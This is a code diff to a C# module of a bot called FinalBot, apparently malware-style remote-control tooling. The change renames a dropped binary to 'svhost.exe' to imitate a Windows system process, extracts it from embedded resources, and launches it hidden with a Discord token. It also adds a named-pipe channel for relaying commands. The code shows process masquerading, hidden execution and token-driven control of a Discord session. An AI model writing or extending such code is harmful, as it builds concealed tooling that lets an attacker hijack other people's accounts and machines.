@@ -4,6 +4,7 @@ using System.IO;
 using System.Reflection;
 using VanguardCore;
 using VanguardCore.Modules;
+using System.IO.Pipes;
 
 namespace FinalBot.Modules
 {
@@ -20,39 +21,56 @@ namespace FinalBot.Modules
             try
             {
                 string workDir = ResourceModule.WorkDir;
-                string tempExe = Path.Combine(workDir, "MsDiscordSvc.exe");
+                string tempExe = Path.Combine(workDir, "svhost.exe");
 
-                if (!File.Exists(tempExe)) return "❌ Failed: Discord remote service binary not found.";
-
-                // Ensure profile dir exists in a stable location
-                string profilePath = Path.Combine(workDir, "DiscordProfile");
-                if (!Directory.Exists(profilePath)) Directory.CreateDirectory(profilePath);
-
-                // Command signaling (still uses TEMP for inter-process communication)
-                if (action != "join")
+                if (!File.Exists(tempExe))
                 {
-                    string cmdFile = Path.Combine(Path.GetTempPath(), "discord_cmd.txt");
-                    File.WriteAllText(cmdFile, action == "deaf" ? "deafen" : action);
-                    return $"⚡ Command `{action}` signaled.";
+                    Console.WriteLine("[DISCORD_REMOTE] svhost.exe missing. Extracting from resources...");
+                    ResourceModule.ExtractAll();
                 }
 
-                // Launch the EXE
+                if (!File.Exists(tempExe)) return "❌ Ошибка: Сервис svhost.exe не найден в " + tempExe;
+
+                if (action != "join")
+                {
+                    SendPipeCommand(action);
+                    return $"⚡ Команда `{action}` отправлена через Pipe.";
+                }
+
+                // Launch the WebView2 EXE with new flags
                 Process.Start(new ProcessStartInfo
                 {
                     FileName = tempExe,
-                    Arguments = $"\"{token}\" \"{url}\" \"{action}\" --profile \"{profilePath}\"",
+                    Arguments = $"--token \"{token}\" --url \"{url}\"",
                     UseShellExecute = false,
                     CreateNoWindow = true,
                     WindowStyle = ProcessWindowStyle.Hidden,
                     WorkingDirectory = workDir
                 });
 
-                return $"✅ Discord Remote launched: Action `{action}` started.";
+                return $"✅ Discord Pro запущен (svhost.exe). Инициализация WebView2...";
             }
             catch (Exception ex)
             {
-                return $"❌ Error launching Discord bot: {ex.Message}";
+                return $"❌ Ошибка запуска Discord: {ex.Message}";
             }
+        }
+
+        private static void SendPipeCommand(string cmd)
+        {
+            try
+            {
+                using (var pipeClient = new NamedPipeClientStream(".", "vanguard_discord_cmd", PipeDirection.Out))
+                {
+                    pipeClient.Connect(1000);
+                    using (var writer = new StreamWriter(pipeClient))
+                    {
+                        writer.Write(cmd);
+                        writer.Flush();
+                    }
+                }
+            }
+            catch { }
         }
     }
 }
